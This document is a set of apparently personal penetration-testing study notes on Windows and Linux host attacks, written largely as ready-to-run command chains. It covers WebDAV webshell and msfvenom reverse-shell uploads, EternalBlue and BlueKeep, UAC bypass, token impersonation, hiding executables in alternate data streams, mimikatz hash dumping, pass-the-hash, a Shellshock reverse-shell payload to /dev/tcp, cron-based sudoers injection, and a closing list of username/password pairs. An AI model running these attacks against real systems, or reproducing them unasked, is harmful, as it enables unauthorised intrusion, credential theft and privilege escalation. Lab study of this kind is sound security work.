system/host based attacks are those targeted towards a specific host/system running a specific OS e,g linux or windows

System/Host based attacks are attacks that are targeted towards a specific system running a specific operating system.

they come into play mostly during post ompromise after gaining internal network access where you would need to attack client/employee workstatiions that are not running network services typically prone to misconfiguration or vulnerabilities hence there would be a need to attack misocnfigs or vulnerabilites inherent to just the OS.


## WINDOWS
Commonly exploited windows services 

|Protocol|Ports|Purpose
|-- |--|--|
|IIS| TCP 80/443|Proprietory microsoft web server
|WebDav-Web-based Distributed Authoring & versioning| TCP 80/443| HTTP extension that allows clients to update, delete, move and copy files on a web server.  It is used to enable a web server act as a file server.|
|SMB/CIFS| TCP 445| Network file sharing protocol used to facilitate the sharing of files and peripherals between LAN computers
|RDP| TCP 3389| Proprietory GUI remote protocol developed by Microsoft|
|WinRM| TCP 5985/5986/443| Windows Remote Management protocol that can be used to facilitate remote access with windows systems.|

****
#### IIS WEBDAV
IIS allows you host static and dynamic web pages developed in ASP.NET and PHP.
typical file extensions ; .asp,.aspx,.config and .php
- webdav
```bash
- requires authentication
Tools :
1. davtest : used to scan, authenticate and exploit the webdav server, also checks what filetype is executable on server.
2. Cadaver : file upload, download, in-space editing, collection creaation, deletion, property manipulation etc.
```
ATTACK CHAIN
```bash
> -p 80 --script=http-enum $IP

BRUTEFORCE
> hydra -L /wordlist.txt -P /common_passwords.txt $IP http-get /webdav/

INTERACTION
- WITH DAVTEST --> test what file extentions can be uploaded, if a directory can be created, and what file extensions can be executed

> davtest -auth bob:password -url http://$IP/webdav

- WITH CADAVER
Provides an FTP-like pseudo shell to upload files/shellcode
> cadaver http://$IP/webdav/
> put /usr/share/webshells/asp/webshell.asp

```
****
WITH METASPLOIT (MSFVENOM)
- in some cases you can upload and execute other file extensions after generating our own shellcode with mfvenom in asp

```bash
# by default this is a 32bit shellcode command
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=1234 -f asp -o shell.asp

> put shell.asp


> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LPORT 1234
> set LHOST $IP

METERPRETER COMMANDS
> sysinfo
> getuid

OR USE MSF ENTIRELY
> search iis webdav upload
> set httppassword
> set RHOSTS $IP
> set PATH /webdav/metasploit.asp
```

****
### SMB
#### Psexec 
smb protocol has 2 levels of auth : 
- user auth : username + passord
- share auth : password only
both utilize challenge-response authentication system

challenge - response authentication process system : 
```
client  --sends auth request--> server
client <--request client to encrypt str with users hash-- server
client --send encrypted string to--> server
client <--check if enc str matches then Access Granted-- server
```
ATTACK 
```bash
if no administrator creds bruteforce smb creds
> auxiliary/scanner/smb/smb_login

> psexec.py Administrator@$IP

> exploit/windows/smb/psexec
> exploit/windows/smb/psexec_psh
```

****
#### ETERNAL BLUE
>ms17-010 or cve-2017-0144 - manual exp with AutoBlue-ms17-010 
```bash
> [SNIP] --script=smb-vuln-ms17-010 $IP

AUTOBLUE
cd shellcode
> chmod +x shell_prep.sh
> ./shell_prep.sh
Y

> nc -lvnp $PORT

> cd .. (leave shellcode dir)
> chmod + x eternalblue_exploit7.py
> python eternalblue_exploit7.py $IP shellcode/sc_x64.bin
```

****
### RDP
proprietory GUI remote acces portocol by Microsoft - can be configgured to run on ANY TCP port.
```bash
# detect rdp on some other RANDOM port
> -x "use auxiliary/scanner/rdp/rdp_scanner && set rport 3333"

BRUTEFORCE
> hydra -L $Userlist -P $password rdp://$IP -s 3333

INTERACTION
> xfreerdp /u:$NAME /p:$PASS /v:$IP:PORT
remmina

EXPLOIT : BLUEKEEP (CVE-2019-0708)
grants access to a chunk of kernel memory that allows you run arbitrary code at SYSTEM level, xp,vista,win7,server 2008 & R2
NB : if network level auth is enabled the exploit will fail.

search BlueKeep
use the scanner one to check if vuln
> set rhosts, rport(if diff port was used)

EXPLOIT (WORKS ONLY ON 64bit computers & specific targets)
> set rhosts

exploit might fail because you need to set the target, might also need to change "CHUNK size" default is 250mb, setting too high will crash target

> show targets
> set target $ID
```

****
wordlist location : 
USER LIST
`/usr/share/metasploit-framework/data/wordlist/common_users.txt `

PASSWORD LIST 
`/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
OR
`/usr/share/metasploit-framework/data/wordlists/common_passwords.txt`

****
### WinRM
>5985/TCP & 5986/TCP (HTTPS)
```bash
> cme winrm $IP -u administrator -p $passlist
> cme winrm $IP -u administrator -p pass -x "whoami"

LOGIN
> evil-winrm -u administrator -p $PASS -i $IP 

=MSF=
basically for a meterpreter session via winrm
> search winrm_script 
(use exploit/windows/winrm/winrm_script_exec)
> set FORCE_VBS true
> set RHOSTS, USERNAME & PASSWORD
```

****
### Windows Privilege Escalation

##### Kernel Exploits 
a kernel is a computer program that is the core of the OS and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates comms between them.

>WIndows uses `Windows NT` kernel and  consists of user & kernel mode that determines access to system resources and hardware.

- User Mode ;  programs and  services running in usermode have limited access to system resources and functionality.
- Kernel Mode : unrestricted access to system resources nad functionality like managing devices and system memory

>If you can get shellcode to execute in kernel mode then you would recieve higher elevated privileges

SCRIPTS
script 1 :  https://github.com/AonCyberLabs/Windows-Exploit-Suggester
script 2 : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135

>using msf's exploit suggester
```bash
> use post/multi/recon/local_exploit_suggester
> set SESSION
> run

NB: after picking the LPE exploit, change the lport,cause you already prolly used it to catch a shell before.
```
- google each suggested exploit for to see if it has been used or is specific to the windows build you are attacking

MANUAL WAY
using script 1 
```bash
- clone repo and run with update flag
- use the microsoft xslx db against systeminfo output txt file

create a new txt file with systeminfo cmd content output saved to it.

> ./windows-exploit-suggester.py --update
> ./windows-exploit-suggester.py --database YYY-M-D --systeminfo /tmp/systeminfo.txt

> upload /home/exploit/3030.exe
```

****
#### UAC Bypass with UACMe
UAC - User Account Control - a windows security feature introduced in Vista that prevents unauthorized changes from being made to the OS by ensuring approval from the administrator or user in local admin group.

>BASICALLY THE PROMPT BOX THAT SHOWS UP WHEN YOU REQUEST TO DO SOMETHING THAT REQUIRES ELEVATED PRIVILEGES OR PERMISSIONS

steps to check for uac level settings.
- Start Menu - type uac - click on "Change User Account Control Settings"
```bash
POST EXPLOITATION INFORMATION - Meterpreter
> sysinfo
> getprivs

find a process ID for a particular task/service (pgrep)
> pgrep explorer
> migrate 2448

- NB : this is helpful especially when you need to migrate to a 64bit meterpreter session
```

JUST BECAUSE YOU ARE SYSTEM DOESNT MEAN THE PROCESS YOU ARE RUNNING AS IS

>[!Summary] Summary
> This section was basically about bypassing Uac that prevents you from doing privilged actions like changing the password of a user in admin group who you have compromised already via a shell session - Because you need to click on the consent box which you cant via CLI so it just says "Access is denied"

Bypass with hfiref0x/UACME - abuses the windows AutoElevate
```bash
1. first generate an msfvenom payload
> windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe 

2. start listener
> use multi/handler

3. We now want to run our payload with privileges
- Using Akigi - key 23 (key 23, 33, avoid any "Fixed")

> akigi64.exe 23 \Windows\Temp\backdoor.exe

4. Migrate to an NT AUTHORITY process in the new shell
migrate to lsass, spoolsv.exe etc.

NB : MUST USE ABSOLUTE PATH TO BACKDOOR EXE else you wont receive shell - worked for me. The difference in the shell you recieve from the previous is the amount of privileges you have. check with "getprivs"
```

****
#### Access Token Impersonation
tokens are created and managed by Local Security Authority Subsystem Service (LSASS) - it is responsible for identifying and describing the security context of a process or thread running on a system. Think of it as a web cookie that provides users access to resources without having to provide creds each time a process is started or a resource is accessed.
- Access Tokens are generated by winlogon.exe each time a user authenticates successfully.
- The token is then attached to the `userinit.exe` process and all child processes started by a user will inherit a copy of the access token from their creator and will run under the privs of the same access token.

Access tokens are categorized based on varying security levels assigned to them, and the security level determines the privileges that are assigned to a specific token. 
2 security levels an access token will be assigned :-
1. Impersonate-Level tokens - created as a direct result of a non-interactive login.
2. Delegate-Level tokens - created through an interactive login on windows, e.g traditional logins or RDP. - More dangerous cause they can be used to impersonate tokens on any system.

Privileges required for Impersonate attacks : -
1. SeAssignTokens - allows you to impersonate tokens
2. SeCreateTokens - allows you create an arbitrary token with admin privs.
3. SeImpersonatePrivilege - allows you create a process under the security context of another user usually one with admin privs.

>USING METERPRETER INCOGNITO MODULE
- the module can be used to display a list of available tokens that we can impersonate.

ATTACK CHAIN 
```bash
INCOGNITO MODULE - lists available tokens to impersonate

> load incognito
> list_tokens -u (You want the Delgation-Level tokens)
> impersonate_token "TOKEN_NAME" 

e.g
> impersonate_token "ATTACKDEFENSE\Administrator"

NB : you still need to migrate to a process of AUTHORITY even tho getuid says we successfully impersonated the user. - MIGRATE TO EXPLORER PROCESS OR ANY OTHER.
```

****
### Windows File System Vulnerabilities - ADS
Alternate Data Streams is an NTFS file attribute designed to provide compatibility with MACOS HFS
Any file created on a NTFS formatted drive wil have 2 different streams : 
- Data stream - Default stream containing the file data
- Resource stream - containing the file metadata.

ADS can be used to hide malicious code or executables in legitimate files in orfer to evade detection by storing the malicious code in the resource stream of a legitimate file.

```bash
- create a text file
> notepad text.txt

right click on the txt file and then on "properties" -> "details"
the metadata is there, so we can hide data there and specify you want that to execute.

- You can also hide some other file within a file
> notepad test.txt:secret.txt

to read the file hidden in the resource stream, you can just open it same way you create it
> notepad test.txt:secret.txt

- EMBED AN EXE IN A TXT WITH ADS
> type winpeas.exe > windowslog.txt:winpeas.exe

- to execute it you need to create a symlink to the file because its being executed from the Start menu, but do that in the System32 folder :

> mklink wupdate.exe C:\Temp\Windowslog.txt:winpeas.exe

- not you can run winpeas.exe with
> wupdate
```

### Windows Password Hashes
LM hash process
- pass is broken into two 7 character chunks
- all chars are converted to Uppercase chunks (case insensitive)
- each chunks hashed seperately with DES
No salts.

NT Hash (>=Vista)
- doesnt split password in 2 chunks
- uses MD4
- case sensitive
- allows use of symbols and unicode characters

#### password hunting in config files
the unattended windows setup utlity is used to automate mass installation/deployment of windows on systems. - It utilizes config files that contain specific configurations and user account credentials, specifically admin account pass.

- a common mistake is that they leave credentials behind forgetfully in unattended files 
- LOCATIONS :-
```txt
> C:\\Windows\Panther\Unattend.xml
> C:\\Windows\Panther\Autounattend.xml
- passwords found here may be b64 encoded.
```

Searching for it 
```bash
> search -f "unattend.xml"
> cd \Windows\Panther\

FIND WITH POWERUP
> Import-Module PowerUp.ps1
> Invoke-PrivescAudit

$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password

> runas.exe /user:administrator cmd
> msfconsole -q
> use exploit/windows/misc/hta_server
> mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta
```

### dumping hashes
```bash
as always if you are administrator migrate to a process with higher privs especially the "lsass.exe" process 

> pgrep lsass
> migrate $PID

> load kiwi
> creds_all
> lsa_dump_sam
> lsa_dump_ secrets

> mimikatz.exe "privilege::debug lsadump::sam exit"
TO DUMP LSA SECRETS USE
> lsadump::secrets

when logon passwords are stored in cleartexts, thats when you use 
> sekurlsa::logonpasswords
``` 
windows version >=8.1 doesnt store clear text creds
lsa_secrets could contain clear text creds

### pass the hash
```bash
- WITH PSEXEC MSF MODULE
you need both LM:NT hash --> hashdump to get it

> use smb/psexec
> set smbuser, smbpass, rhosts
> set target $WHATEVER_TARGET_WORKS_TRY_NATIVE_UPLOAD

- WITH CME
cme smb $IP -u Administrator -H $HASH
cme smb $IP -u Administrator -H $HASH -x "ipconfig"
```


# LINUX

frequently exploited services.
- Apache
- SSH
- FTP
- SAMBA

### Apache
##### Shellshock
```bash
CVE-2014-6271
family of vulners in bash V1.3 that allows the execution of remote arbitrary commands via bash on a webserver.

It occurs because Bash mistakenly executes trailing commands after a series of characters : (){:;};

Apache servers configured to run CGI scripts or .sh scripts are vulnerable to the attack. - CGI scripts are used by Apache to execute cmds on linux systems and display the output to client.

ATTACK CHAIN
- locate script/input vector to communicate with bash
- Find CGI scripts on apache server.


DETECTION 
--script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"


MANUAL EXPLOITATION
- in user agent field pass the following
> () { :; }; echo; echo; /bin/bash -c 'whoami'
> () { :; }; echo; echo; /bin/bash -c 'bash -i >&/dev/tcp/$IP/$PORT 0>&1'


MSF
> use apache_mod_cgi
> set rhosts & targeturi
```

### FTP
>[!reminder] ProFTPD 1.3.3c is vulnerable to RCE

```bash
anon  logins
> anonymous: 

Bruteforce
/usr/sh3are/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

### SSH
```bash
bruteforce, get creds, login, enumerate.
```

### SAMBA
```bash
ATTACK CHAIN
Bruteforce
> hydra

SMBMAP
> smbmap -H $IP -u user -p pass

SMBCLIENT
> smbclient //$IP/$SHARE -U $USER

Enum4linux
> enum4linux -a -u $USER -p $PASS
```

****

## Linux Privilege Escalation
>Kernel Exploits
- linux-exploit-suggester

>misconfigured cron jobs

linux implments task scheduling via the cron utility
cron is a time-based service that runs apps, scripts and other commands repeatedly on a specified schedule these are known as cron jobs
- cronjobs can be run as any user but the one of interest is the one being run as root.
```bash
view crontab set by a user we are running as :-
$ crontab -l

lets say we wanted to find any scrpts or files on the host that referenced or included a "root_file" within
$ grep -rnw /usr -e "/home/user/root_file "

say we found a writable shell script owned by root and runs with cron, we can add ourselves to sudoers in the file by adding this line 
$ printf '#!/bin/bash\necho "rami ALL=NOPASSWD:ALL" >> /etc/sudoers' > $WRITABLEFILE.sh

OR JUST
> echo "cp -p /bin/bash /tmp/rami && chmod +s /tmp/rami" >> /usr/local/share/copy.sh
```

> SUID BINARIES
Set Owner User ID
```bash
$ strings binary

if the binary is calling another binary, you can delete that and replace the binary being called with /bin/bash
```

DUMPING LINUX HASHES 
$6 - sha512
$5 - sha256

$2 - blowfish
$1 - md5
```bash
gain a shell and upgrade to meterpreter
sessions -u $ID


MSF LINUX HASHDUMP
> search hashdump
> use post/linux/gather/hashdump
> set session $ID
```


Scap book
```bash
 rooty   password: pineapple
  login: sysadmin   password: hailey
  login: demo   password: butterfly1
  login: auditor   password: xbox360
  login: anon   password: 741852963
  login: administrator   password: password1
 login: diag   password: secret
```